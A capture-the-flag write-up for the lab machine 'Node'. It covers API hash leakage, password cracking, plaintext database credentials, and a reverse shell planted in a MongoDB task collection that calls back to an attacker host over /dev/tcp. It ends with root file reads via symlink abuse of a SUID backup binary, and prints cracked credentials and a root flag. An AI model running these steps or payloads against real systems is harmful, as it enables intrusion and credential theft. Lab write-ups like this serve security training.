---
layout: default
---
# Node

# Enumeration

IP → 10.10.10.58

Open ports

```bash
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
3000/tcp open  ppp     syn-ack
```

```bash
PORT     STATE    SERVICE            REASON      VERSION
20/tcp   filtered ftp-data           no-response
3000/tcp open     hadoop-tasktracker syn-ack     Apache Hadoop
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
| hadoop-tasktracker-info: 
|_  Logs: /login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| hadoop-datanode-info: 
|_  Logs: /login
|_http-title: MyPlace
```

## Port 3000

Inital enumeration of HTTP headers and frameworks used.

```bash
┌──(kali㉿kali)-[~/machines/linux/node/enumeration]
└─$ curl -I 10.10.10.58:3000                                                       
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Sat, 02 Sep 2017 11:27:58 GMT
ETag: W/"f15-15e4258ef70"
Content-Type: text/html; charset=UTF-8
Content-Length: 3861
Date: Thu, 14 Dec 2023 09:10:47 GMT
Connection: keep-alive

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/linux/node/enumeration]
└─$ whatweb 10.10.10.58:3000                                 
http://10.10.10.58:3000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.10.58], JQuery, Script[text/javascript], Title[MyPlace], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

It is using Express so it has this is a Node server. Inspecting the source code we see custom JS files.

```bash
<script type="text/javascript" src="assets/js/app/app.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/home.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/login.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/admin.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/profile.js"></script>
```

Inside of this we find routes to http://10.10.10.58/api/ that may expose sensitive information. We can see a http://10.10.10.58/api/users/latest with the following data.

![Untitled](/images/node1.png)

We can use Crackstation ([https://crackstation.net/](https://crackstation.net/)) to crack this hashes.

![Untitled](/images/node2.png)

Trying to log in will be of no use. There must be an admin user so let’s find him. To find this user we will play with this users URL until we have something new. If we use this URL instead will have a new user which is admin http://10.10.10.58:3000/api/users/.

![Untitled](/images/node3.png)

We can crack the password and we obtain the credentials for the user `myP14ceAdm1nAcc0uNT:manchester`.

# Foothold

With our admin credentials we can now log in with administrative privilege and download a backup of the web server. We will obtain a base64 encoded file.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ head myplace.backup 
UEsDBAoAAAAAABqJEFUAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADFMH7YmLMemV1eAsAAQQAAAAABAAAAABQSwMEFAAJAAgARQEiS0x97zc0EQAAEFMAACEAHAB2YXIvd3d3L215cGxhY2UvcGFja2FnZS1sb2NrLmpzb25VVAkAA9HoqVlL/8pZdXgLAAEEAAAAAAQAAAAAyanppKtv2KjXgYg68ZXG+bj3S8185iWw7h4/jAru9yry2CPMS7w6q2fMKbp6VmyRYRatU3R4kSR3IoCDEk54TwmqAbzpEDun7eKvQKRAED5dox94f2ltPmAWc2XQq3NGp6uRstAsllt6JTZukvOvhjS+tPV8E/IUDjvXl50dhazMXP4OJlbQjsnFTXHl4RFfD864tIaTlY3DB7NFiBt9po0LYpDTkzkMFrAhW7NKhHJol1PKQbOngysKON
```

If we decoded and dump the contents to a file we will a new file with an unknown type. If we use the command `file` we will see that is actually a zip file.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ file backup        
backup: Zip archive data, at least v1.0 to extract, compression method=store
```

To unzip the file a password is needed but we can use zip2john to a obtain a crackable hash.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ zip2john backup > hash

┌──(kali㉿kali)-[~/Downloads]
└─$ john -w=~/rockyou.txt hash               
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (backup)     
1g 0:00:00:00 DONE (2023-12-16 09:01) 33.33g/s 6553Kp/s 6553Kc/s 6553KC/s sandriux..piggy9
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Review source code

With the source code in our hands we can know check if there is an leakage or a vulnerable component.

```bash
┌──(kali㉿kali)-[~/…/node/var/www/myplace]
└─$ ls -la
total 56
drwxr-xr-x  4 kali kali  4096 Aug 16  2022 .
drwxr-xr-x  3 kali kali  4096 Dec 14 10:55 ..
-rw-rw-r--  1 kali kali  3861 Sep  2  2017 app.html
-rw-rw-r--  1 kali kali  8058 Sep  3  2017 app.js
drwxr-xr-x 69 kali kali  4096 Sep  2  2017 node_modules
-rw-r--r--  1 kali kali 21264 Sep  2  2017 package-lock.json
-rw-rw-r--  1 kali kali   283 Sep  2  2017 package.json
drwxrwxr-x  6 kali kali  4096 Sep  2  2017 static
```

The credentials for the database are in plaintext in the source code and we can use this password to connect to the machine via SSH.

```bash
'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

The credentials to acces the machine via SSH are `mark:5AYRft73VtFpc84k` .

# Privilege escalation

### Files owned by frank or tom

- frank → Nothing

```bash
mark@node:/var/scheduler$ find / -user "frank" 2>/dev/null
mark@node:/var/scheduler$ find / -group "frank" 2>/dev/null
```

- tom

```bash
mark@node:/var/scheduler$ find / -user "tom" -maxdepth 2 2>/dev/null
/proc/1238
/proc/1244

mark@node:/var/scheduler$ find / -user "tom" -maxdepth 4 2>/dev/null | grep -v "\/proc"
/home/tom/.npm/_locks

mark@node:/var/scheduler$ find / -group "tom" -maxdepth 4 2>/dev/null | grep -v "\/proc"
/home/tom/.npm/_locks
/home/tom/user.txt
```

### Groups frank and tom are part of

- Frank

```bash
mark@node:/var/scheduler$ cat /etc/group | grep -i frank
```

- tom

```bash
mark@node:/var/scheduler$ cat /etc/group | grep -i frank
mark@node:/var/scheduler$ cat /etc/group | grep -i tom  
adm:x:4:syslog,tom
cdrom:x:24:tom
sudo:x:27:tom
dip:x:30:tom
plugdev:x:46:tom
tom:x:1000:
lpadmin:x:115:tom
sambashare:x:116:tom
admin:x:1002:tom,root
```

### Pivoting to Tom

The only user running a process is tom and he is actually running two processes:

```bash
tom       1238  0.0  5.3 1008568 40440 ?       Ssl  07:55   0:01 /usr/bin/node /var/scheduler/app.js
tom       1244  0.0  5.6 1019880 42860 ?       Ssl  07:55   0:01 /usr/bin/node /var/www/myplace/app.js
```

If we check the script /var/scheduler/app.js it takes docuements from a collection of a mongo database, and execute the cmd field.

```bash
mark@node:/var/scheduler$ cat app.js 
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

To leverage this we can insert a new document in the database and execute a reverse shell.

We will encode the payload in base64.

```bash
┌──(kali㉿kali)-[~/tools]
└─$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.4/443 0>&1"' | base64 
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0MyAwPiYxIgo=
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tools]
└─$ echo 'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0MyAwPiYxIgo=' | base64  -d
bash -c "bash -i >& /dev/tcp/10.10.14.4/443 0>&1"
```

We connect to the database and insert the record.

```bash
mark@node:/var/scheduler$ mongo scheduler -u mark -p 5AYRft73VtFpc84k
MongoDB shell version: 3.2.16
connecting to: scheduler
> show dbs
2023-12-16T08:42:34.644+0000 E QUERY    [thread1] Error: listDatabases failed:{
        "ok" : 0,
        "errmsg" : "not authorized on admin to execute command { listDatabases: 1.0 }",
        "code" : 13
} :
_getErrorWithCode@src/mongo/shell/utils.js:25:13
Mongo.prototype.getDBs@src/mongo/shell/mongo.js:62:1
shellHelper.show@src/mongo/shell/utils.js:769:19
shellHelper@src/mongo/shell/utils.js:659:15
@(shellhelp2):1:1

> show collections
tasks
> db.tasks.find()
> db.tasks.count()
0
> db.tasks.insert( {cmd: "echo 'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0MyAwPiYxIgo=' | base64  -d | bash"} )
WriteResult({ "nInserted" : 1 })
```

We receive a reverse shell as tom

```bash
┌──(kali㉿kali)-[~/…/node/var/www/myplace]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.58] 43990
bash: cannot set terminal process group (1238): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:/$
```

### To root

If we find SUID binaries we will find an odd one.

```bash
tom@node:/$ ls -la /usr/local/bin/
total 28
drwxr-xr-x  2 root root   4096 Aug 16  2022 .
drwxr-xr-x 10 root root   4096 Aug 16  2022 ..
-rwsr-xr--  1 root admin 16484 Sep  3  2017 backup
```

This binary is used by the web server to create the backup. When we download the backup, root executes the following.

```bash
2023/12/16 09:01:13 CMD: UID=0     PID=1865   | sh -c /usr/bin/zip -r -P magicword /tmp/.backup_1860759768 /var/www/myplace > /dev/null 
2023/12/16 09:01:13 CMD: UID=0     PID=1864   | sh -c /usr/bin/zip -r -P magicword /tmp/.backup_1860759768 /var/www/myplace > /dev/null 
2023/12/16 09:01:13 CMD: UID=0     PID=1867   | sh -c /usr/bin/base64 -w0 /tmp/.backup_1860759768 
2023/12/16 09:01:13 CMD: UID=0     PID=1866   | sh -c /usr/bin/base64 -w0 /tmp/.backup_1860759768
```

In the source code we can see that they executes this binary with the following format.

- `/usr/local/bin/backup -q <KEY> <DIR>`

```bash
2023/12/16 09:04:58 CMD: UID=0     PID=1886   | sh -c /usr/bin/zip -r -P magicword /tmp/.backup_278074881 /home/tom/ > /dev/null 
2023/12/16 09:04:58 CMD: UID=0     PID=1885   | sh -c /usr/bin/zip -r -P magicword /tmp/.backup_278074881 /home/tom/ > /dev/null 
2023/12/16 09:04:58 CMD: UID=0     PID=1888   | sh -c /usr/bin/base64 -w0 /tmp/.backup_278074881 
2023/12/16 09:04:58 CMD: UID=0     PID=1887   | sh -c /usr/bin/base64 -w0 /tmp/.backup_278074881
```

The key can be obtained from the source code. We can compress any direcory we can which means that we can read any file.

```bash
tom@node:~$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
 [+] Finished! Encoded backup is below:
                                                                                                                                                                                                                                            
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
```

But that’s not actually the file we are trying to read, instead it seems there is some kind of protection. To bypass this we can create a directory called **test** under **/dev/shm**.

### Via symlinks

 From here we will create all the symlinks we want to files or directories that we want to compress.

```bash
tom@node:/dev/shm/test$ ls -la
total 0
drwxr-xr-x 2 tom  tom  80 Dec 16 09:23 .
drwxrwxrwt 3 root root 60 Dec 16 09:23 ..
lrwxrwxrwx 1 tom  tom   5 Dec 16 09:22 root -> /root
lrwxrwxrwx 1 tom  tom  11 Dec 16 09:18 shadow -> /etc/shadow
```

```bash
tom@node:/dev/shm/test$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /dev/shm/test/
root/   shadow  
tom@node:/dev/shm/test$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /dev/shm/test/
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
```

If we unzip this file we will obtain the shadow and the /root folder

```bash
┌──(kali㉿kali)-[~/…/dev/shm/test/root]
└─$ ls -la
total 32
drwx------ 4 kali kali 4096 Aug 17  2022 .
drwxr-xr-x 3 kali kali 4096 Dec 16 10:23 ..
-rw-r--r-- 1 kali kali 3106 Oct 22  2015 .bashrc
drwx------ 2 kali kali 4096 Aug 16  2022 .cache
drwxr-xr-x 2 kali kali 4096 Aug 16  2022 .nano
-rw-r--r-- 1 kali kali  148 Aug 17  2015 .profile
-rw------- 1 kali kali  645 Aug 17  2022 .viminfo
-rw-r----- 1 kali kali   33 Dec 16 08:55 root.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/dev/shm/test/root]
└─$ cat root.txt        
154a0a483767e17b54ad6e91cc6214d6
```

### Vía CWD

If we indicate a relative path to root directory we will retrieve its contents also.

```bash
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root/
UEsDBAoAAAAAAMRlEVUAAAAAAAAAAAAAAAAFABwAcm9vdC9VVAkAA//U/GKZbH1ldXgLAAEEAAAAAAQAAAAAUEsDBBQACQAIANGDEUd/sK5kgwAAAJQAAAANABwAcm9vdC8ucHJvZmlsZVVUCQADGf7RVZlsfWV1eAsAAQQAAAAABAAAAADmvaHHlLANvERDtBF0ACPC43AyT0S6eoprpbwStBQrpW6s+c93Vl7U5Nw3zAOempqkX4UprsrqxoZ926qJ/2BZzzjLmsAwArl2Oqraez/HzE/0Bnah80Hnm2YSktG+tf6Bl9uBgEo/Uf5ReIZaTQCPzTeyV3rVQdVKJ3PmI9IfvMLS61BLBwh/sK5kgwAAAJQAAABQSwMECgAAAAAAGYkQVQAAAAAAAAAAAAAAAAwAHAByb290Ly5jYWNoZS9VVAkAAxLB+2KZbH1ldXgLAAEEAAAAAAQAAAAAUEsDBAoACQAAADR8I0sAAAAADAAAAAAAAAAgABwAcm9vdC8uY2FjaGUvbW90ZC5sZWdhbC1kaXNwbGF5ZWRVVAkAA8MSrFmZbH1ldXgLAAEEAAAAAAQAAAAAxFchW/InIqgGHhUZUEsHCAAAAAAMAAAAAAAAAFBLAwQKAAkAAADsPpBXghIhpi0AAAAhAAAADQAcAHJvb3Qvcm9vdC50eHRVVAkAA+tXfWXrV31ldXgLAAEEAAAAAAQAAAAAGP296zdmX9orrvQE80TU5RPosyHOY7JybZvb3Jdx5RRqgRj9LThFqBBIV9yAUEsHCIISIaYtAAAAIQAAAFBLAwQUAAkACADrkVZHveUQPpsFAAAiDAAADAAcAHJvb3QvLmJhc2hyY1VUCQADqRkpVplsfWV1eAsAAQQAAAAABAAAAADIX2x7jiV/p3RO9CaDx9dayQkyY8bXEEQ/+lo0uJrqaxor/ieeYBl10zOrpA1hENQG8dVh8BVuXg6WLqpMY2xc28VQRvFW7xMXYMhxpt7qPb8zPmcD7OU5ycNLhtS2cjEObh5/gXrwNr2wDxyofMed15qvWP3ZfSNEWvwEH0VlD7VjHIzhTp5w4bWCi682HxEQj5FDgV/SKUIuxQ9yGdu6RjVndATrB0cC3GOwt/m7k7UdbiMvTfv3ax9NNWk3wNslJkW+4AeCESVwYZajSxHAFyUw8JmLj6TKE77dQRi4f1KOXJkWKrA9Zlc6rHWVSDe229kDb2m